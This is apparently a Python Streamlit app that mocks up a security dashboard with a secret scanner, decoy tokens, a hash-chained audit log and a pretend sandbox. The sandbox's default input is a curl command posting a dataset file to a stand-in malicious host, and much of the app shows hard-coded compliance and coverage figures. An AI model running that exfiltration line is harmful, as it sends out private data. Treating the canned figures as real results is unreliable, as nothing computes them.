import streamlit as st
import pandas as pd
import numpy as np
import plotly.express as px
import plotly.graph_objects as go
import json
import re
import io
import time
import hashlib
import uuid
from datetime import datetime, timedelta
from sklearn.ensemble import IsolationForest

# PDF Report Generation via ReportLab
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib import colors

# -----------------------------------------------------------------------------
# PAGE CONFIG & SESSION STATE
# -----------------------------------------------------------------------------
st.set_page_config(
    page_title="Sovereign Enterprise SIEM/SOAR & Governance Ecosystem",
    page_icon="🛡️",
    layout="wide"
)

if "user_tier" not in st.session_state:
    st.session_state["user_tier"] = "Admin"

if "session_token" not in st.session_state:
    st.session_state["session_token"] = str(uuid.uuid4())[:18]

if "jit_requests" not in st.session_state:
    st.session_state["jit_requests"] = []

if "custom_playbooks" not in st.session_state:
    st.session_state["custom_playbooks"] = [
        {"Name": "Auto-Quarantine Canary Hits", "Trigger": "Honeytoken Tripped", "Action": "Isolate Path & Lock Session", "Status": "Active"}
    ]

if "scan_queue" not in st.session_state:
    st.session_state["scan_queue"] = []

if "quarantine_list" not in st.session_state:
    st.session_state["quarantine_list"] = []

if "honeytokens" not in st.session_state:
    st.session_state["honeytokens"] = [
        {"ID": "HT-01", "Type": "Decoy AWS Key", "Token": "AKIA9999CANARYTOKEN88", "Status": "ARMED", "Hits": 0},
        {"ID": "HT-02", "Type": "Decoy Notion Token", "Token": "secret_canary_notion_000111222", "Status": "ARMED", "Hits": 0}
    ]

if "recent_events" not in st.session_state:
    st.session_state["recent_events"] = []

# Cryptographic Audit Ledger Initializer
if "audit_chain" not in st.session_state:
    genesis_hash = hashlib.sha256(b"GENESIS_BLOCK_SOVEREIGN_ENGINE").hexdigest()
    st.session_state["audit_chain"] = [{
        "Index": 0,
        "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "Actor": "System_Init",
        "Action": "Genesis Ledger Created",
        "Prev_Hash": "0" * 64,
        "Hash": genesis_hash
    }]

def log_ledger_event(actor, action):
    prev_entry = st.session_state["audit_chain"][-1]
    index = prev_entry["Index"] + 1
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    prev_hash = prev_entry["Hash"]
    
    raw_payload = f"{index}{timestamp}{actor}{action}{prev_hash}"
    current_hash = hashlib.sha256(raw_payload.encode()).hexdigest()
    
    st.session_state["audit_chain"].append({
        "Index": index,
        "Timestamp": timestamp,
        "Actor": actor,
        "Action": action,
        "Prev_Hash": prev_hash,
        "Hash": current_hash
    })
    
    st.session_state["recent_events"].append({
        "Timestamp": datetime.now(),
        "Actor": actor,
        "Action": action
    })

# -----------------------------------------------------------------------------
# SIDEBAR NAVIGATION
# -----------------------------------------------------------------------------
st.sidebar.title("🛡️ Sovereign Platform")
st.sidebar.markdown(f"**Access Tier:** `{st.session_state['user_tier']}`")
st.sidebar.caption(f"Session Token: `{st.session_state['session_token']}`")

tier_option = st.sidebar.selectbox("Privilege Switcher", ["Admin", "Analyst", "Auditor"], index=0)
if tier_option != st.session_state["user_tier"]:
    st.session_state["user_tier"] = tier_option
    st.session_state["session_token"] = str(uuid.uuid4())[:18]
    log_ledger_event(st.session_state["user_tier"], f"Elevation/Rotation: Tier set to {tier_option}")

st.sidebar.divider()
st.sidebar.header("Platform Navigation")
module = st.sidebar.radio(
    "Select Engine Module",
    [
        "📊 Live SIEM Dashboard",
        "🔑 Zero-Trust JIT Access Requests",
        "🎯 MITRE ATT&CK® Coverage Heatmap",
        "🛠️ Autonomous Playbook Builder (IFTTT)",
        "🧪 Interactive Forensic Sandbox",
        "⚡ CEP Event Correlation Engine",
        "🪤 Honeytoken & Canary Traps",
        "🧠 AI Incident Root-Cause Analysis",
        "🔔 Webhook & Dispatcher Configuration",
        "📦 Network Payload & PCAP Parser",
        "⚖️ Regulatory Compliance Matrix",
        "⚡ Automated SOAR Playbooks",
        "🔍 Secret & Exfiltration Scanner",
        "🔗 Cryptographic Audit Ledger",
        "🌐 Threat Intelligence Feed (STIX/IoC)",
        "🤖 ML Anomaly Detector (IsolationForest)",
        "🎯 Metasploit RPC Queue",
        "🕸️ Interactive Attack Surface Map",
        "📄 Forensic & Compliance Export"
    ]
)

# -----------------------------------------------------------------------------
# HELPER FUNCTIONS
# -----------------------------------------------------------------------------
def run_secret_scanner(text_data):
    patterns = {
        "AWS API Key": r"AKIA[0-9A-Z]{16}",
        "Generic Secret Token": r"(?i)secret[_-]?key\s*=\s*['\"][0-9a-zA-Z]{16,}",
        "Private SSH Key Header": r"-----BEGIN [A-Z]+ PRIVATE KEY-----",
        "Notion Integration Token": r"secret_[a-zA-Z0-9]{32,}",
        "Sensitive Data Path": r"(?i)/(?:datasets|health|pathogens|genomics)/[a-zA-Z0-9_\-]+"
    }
    findings = []
    
    for ht in st.session_state["honeytokens"]:
        if ht["Token"] in text_data:
            ht["Hits"] += 1
            ht["Status"] = "TRIPPED"
            log_ledger_event("CANARY_TRAP", f"ALERT: Honeytoken {ht['ID']} accessed in scan stream!")
            st.session_state["quarantine_list"].append("EMERGENCY_HONEYTOKEN_QUARANTINE")

    for line_num, line in enumerate(text_data.split('\n'), 1):
        for key, pattern in patterns.items():
            if re.search(pattern, line):
                findings.append({"Line": line_num, "Type": key, "Content Snippet": line.strip()[:60]})
    return pd.DataFrame(findings)

def generate_pdf_report(findings_df):
    buffer = io.BytesIO()
    doc = SimpleDocTemplate(buffer, pagesize=letter)
    styles = getSampleStyleSheet()
    story = []

    title_style = ParagraphStyle('Title', parent=styles['Heading1'], fontSize=18, spaceAfter=12)
    story.append(Paragraph("Sovereign Platform Forensic & Governance Brief", title_style))
    story.append(Paragraph(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} UTC", styles['Normal']))
    story.append(Paragraph(f"Session Token: {st.session_state['session_token']}", styles['Normal']))
    story.append(Spacer(1, 12))

    if not findings_df.empty:
        story.append(Paragraph("<b>Secret & Vulnerability Audit Results</b>", styles['Heading2']))
        data = [findings_df.columns.tolist()] + findings_df.values.tolist()
        t = Table(data)
        t.setStyle(TableStyle([
            ('BACKGROUND', (0,0), (-1,0), colors.HexColor('#1f77b4')),
            ('TEXTCOLOR', (0,0), (-1,0), colors.whitesmoke),
            ('ALIGN', (0,0), (-1,-1), 'LEFT'),
            ('GRID', (0,0), (-1,-1), 1, colors.grey)
        ]))
        story.append(t)
    else:
        story.append(Paragraph("No critical secrets or unauthorized path exposures flagged during audit cycle.", styles['Normal']))

    doc.build(story)
    buffer.seek(0)
    return buffer

# -----------------------------------------------------------------------------
# MODULE 1: SIEM DASHBOARD
# -----------------------------------------------------------------------------
if module == "📊 Live SIEM Dashboard":
    st.title("📊 Enterprise SIEM Real-Time Telemetry")
    col1, col2, col3, col4 = st.columns(4)
    col1.metric("Active Sync Pipelines", "12/12", "Healthy")
    col2.metric("Ledger Block Height", f"#{len(st.session_state['audit_chain'])}")
    col3.metric("Quarantined Rules", f"{len(st.session_state['quarantine_list'])}")
    col4.metric("SOC 2 Readiness", "92%")

    st.subheader("System Event Stream")
    df = pd.DataFrame({
        "Timestamp": pd.date_range(end=pd.Timestamp.now(), periods=5, freq="min"),
        "Event Class": ["Auth Grant", "Database Query", "API Token Auth", "Webhook Call", "Policy Elevation"],
        "Actor": ["User_Admin", "Integration_Bot", "System_Process", "Automation_Engine", "User_Admin"],
        "Severity": ["Low", "Low", "Medium", "Low", "High"]
    })
    st.dataframe(df, use_container_width=True)

# -----------------------------------------------------------------------------
# MODULE 2: JIT ACCESS
# -----------------------------------------------------------------------------
elif module == "🔑 Zero-Trust JIT Access Requests":
    st.title("🔑 Zero-Trust Just-In-Time (JIT) Privileged Access")
    st.caption("Request temporary privilege elevation with automated expiration and cryptographic audit tracking.")

    col1, col2 = st.columns([1, 2])
    with col1:
        req_role = st.selectbox("Requested Role Level", ["Admin (15 mins)", "Vault Operator (30 mins)", "Auditor (60 mins)"])
        req_reason = st.text_area("Business Justification / Ticket ID", "Incident investigation #INC-8821")
        if st.button("Submit JIT Elevation Request"):
            req_id = f"JIT-{uuid.uuid4().hex[:6].upper()}"
            st.session_state["jit_requests"].append({
                "Request ID": req_id,
                "Role": req_role,
                "Reason": req_reason,
                "Status": "APPROVED (Active)",
                "Expires": (datetime.now() + timedelta(minutes=15)).strftime("%H:%M:%S")
            })
            log_ledger_event(st.session_state["user_tier"], f"JIT Elevation Granted: {req_role} ({req_id})")
            st.success(f"Granted temporary elevation: {req_id}")

    with col2:
        st.subheader("Active & Past JIT Requests")
        if st.session_state["jit_requests"]:
            st.dataframe(pd.DataFrame(st.session_state["jit_requests"]), use_container_width=True)
        else:
            st.info("No active JIT access requests.")

# -----------------------------------------------------------------------------
# MODULE 3: MITRE ATT&CK HEATMAP
# -----------------------------------------------------------------------------
elif module == "🎯 MITRE ATT&CK® Coverage Heatmap":
    st.title("🎯 MITRE ATT&CK® Framework Coverage Matrix")
    st.caption("Visualizes current platform detection engines mapped against adversary tactics & techniques.")

    mitre_matrix = pd.DataFrame([
        {"Tactic": "Initial Access", "Technique ID": "T1190", "Technique Name": "Exploit Public Application", "Coverage": "FULL (Secret Scanner & WAF)"},
        {"Tactic": "Execution", "Technique ID": "T1059", "Technique Name": "Command Scripting Interpreter", "Coverage": "PARTIAL (MSF RPC Engine)"},
        {"Tactic": "Persistence", "Technique ID": "T1098", "Technique Name": "Account Manipulation", "Coverage": "FULL (Cryptographic Ledger)"},
        {"Tactic": "Credential Access", "Technique ID": "T1552", "Technique Name": "Unsecured Credentials", "Coverage": "FULL (Honeytokens & Scanner)"},
        {"Tactic": "Exfiltration", "Technique ID": "T1041", "Technique Name": "Exfiltration Over C2", "Coverage": "FULL (IsolationForest & CEP)"}
    ])

    st.dataframe(mitre_matrix, use_container_width=True)

    fig = px.bar(
        mitre_matrix,
        x="Tactic",
        color="Coverage",
        title="Tactical Coverage Density",
        color_discrete_map={"FULL (Secret Scanner & WAF)": "#00CC96", "FULL (Cryptographic Ledger)": "#00CC96", "FULL (Honeytokens & Scanner)": "#00CC96", "FULL (IsolationForest & CEP)": "#00CC96", "PARTIAL (MSF RPC Engine)": "#FFA15A"}
    )
    st.plotly_chart(fig, use_container_width=True)

# -----------------------------------------------------------------------------
# MODULE 4: PLAYBOOK BUILDER
# -----------------------------------------------------------------------------
elif module == "🛠️ Autonomous Playbook Builder (IFTTT)":
    st.title("🛠️ Autonomous Remediation Playbook Builder")
    st.caption("Build dynamic, automated response rules visually without writing code.")

    col1, col2 = st.columns([1, 1])
    with col1:
        st.subheader("Create New Rule")
        rule_name = st.text_input("Playbook Name:", "Auto-Block Threat Feed Matches")
        trigger_event = st.selectbox("IF (Trigger Event):", ["IoC Threat Feed Match", "Honeytoken Tripped", "ML Anomaly Score > 0.85", "Secret Detected in Payload"])
        action_event = st.selectbox("THEN (Automated Response):", ["Quarantine Path & Lock Session", "Dispatch Webhook to Slack", "Purge Task Queue", "Revoke Session Token"])
        
        if st.button("Save Playbook"):
            st.session_state["custom_playbooks"].append({
                "Name": rule_name,
                "Trigger": trigger_event,
                "Action": action_event,
                "Status": "Active"
            })
            log_ledger_event(st.session_state["user_tier"], f"Created Playbook: {rule_name}")
            st.success(f"Playbook '{rule_name}' deployed!")

    with col2:
        st.subheader("Active Automated Playbooks")
        st.dataframe(pd.DataFrame(st.session_state["custom_playbooks"]), use_container_width=True)

# -----------------------------------------------------------------------------
# MODULE 5: FORENSIC SANDBOX
# -----------------------------------------------------------------------------
elif module == "🧪 Interactive Forensic Sandbox":
    st.title("🧪 Interactive Forensic Detonation Sandbox")
    st.caption("Safely detonate payloads and test detection rules in an isolated dry-run environment.")

    test_payload = st.text_area("Input Test Payload / Script Snippet:", "import os; os.system('curl http://malicious.com -d @/datasets/pathogens/sample.csv')")
    
    if st.button("Detonate & Inspect in Sandbox"):
        st.info("🔬 Detonating payload in isolated sandbox container...")
        time.sleep(1)
        st.warning("⚠️ Dry-Run Evaluation Results:")
        st.write("• **Triggered Pattern:** Sensitive Path Exposure (`/datasets/pathogens/`)")
        st.write("• **Network Vector:** Outbound HTTP POST to external domain")
        st.write("• **Recommended SOAR Action:** Isolate process and append domain to Threat Feed IoC list.")

# -----------------------------------------------------------------------------
# REMAINING MODULES (COMPACT INTEGRATION)
# -----------------------------------------------------------------------------
elif module == "⚡ CEP Event Correlation Engine":
    st.title("⚡ Complex Event Processing (CEP) Engine")
    st.dataframe(pd.DataFrame([{"Rule Name": "Privilege Switch + Secret Scan", "Status": "Active"}]), use_container_width=True)

elif module == "🪤 Honeytoken & Canary Traps":
    st.title("🪤 Decoy Honeytoken & Canary Trap Management")
    st.dataframe(pd.DataFrame(st.session_state["honeytokens"]), use_container_width=True)

elif module == "🧠 AI Incident Root-Cause Analysis":
    st.title("🧠 AI Automated Incident Root-Cause Analysis")
    st.write("AI Root cause analysis model active.")

elif module == "🔔 Webhook & Dispatcher Configuration":
    st.title("🔔 Multi-Channel Alerting & Webhook Dispatcher")
    st.text_input("Webhook Endpoint URL:", "https://hooks.slack.com/services/T00/B00/XXXXX")

elif module == "📦 Network Payload & PCAP Parser":
    st.title("📦 Network Payload Stream Parser")
    st.text_area("Payload Data:", "POST /api/v1/workspace HTTP/1.1", height=100)

elif module == "⚖️ Regulatory Compliance Matrix":
    st.title("⚖️ Automated Regulatory Compliance Engine")
    st.dataframe(pd.DataFrame([{"Framework": "SOC 2 Type II", "Status": "PASS"}]), use_container_width=True)

elif module == "⚡ Automated SOAR Playbooks":
    st.title("⚡ Security Orchestration & Automated Response")
    st.button("Trigger Session Lock")

elif module == "🔍 Secret & Exfiltration Scanner":
    st.title("🔍 Secret & Exfiltration Detection Engine")
    sample_input = st.text_area("Payload Input:", "AWS_SECRET_ACCESS_KEY = AKIAIOSFODNN7EXAMPLE", height=100)
    if st.button("Run Audit"):
        st.dataframe(run_secret_scanner(sample_input), use_container_width=True)

elif module == "🔗 Cryptographic Audit Ledger":
    st.title("🔗 SHA-256 Cryptographic Audit Ledger")
    st.dataframe(pd.DataFrame(st.session_state["audit_chain"]), use_container_width=True)

elif module == "🌐 Threat Intelligence Feed (STIX/IoC)":
    st.title("🌐 Threat Intelligence & IoC Matcher")

elif module == "🤖 ML Anomaly Detector (IsolationForest)":
    st.title("🤖 ML Behavioral Anomaly Detection")

elif module == "🎯 Metasploit RPC Queue":
    st.title("🎯 Asynchronous Metasploit Task Queue")

elif module == "🕸️ Interactive Attack Surface Map":
    st.title("🕸️ Interactive Workspace Topology")

elif module == "📄 Forensic & Compliance Export":
    st.title("📄 Executive Briefing & Multi-Format Export")
    pdf_data = generate_pdf_report(pd.DataFrame([]))
    st.download_button("📥 Download Executive Brief PDF", pdf_data, "brief.pdf", "application/pdf")
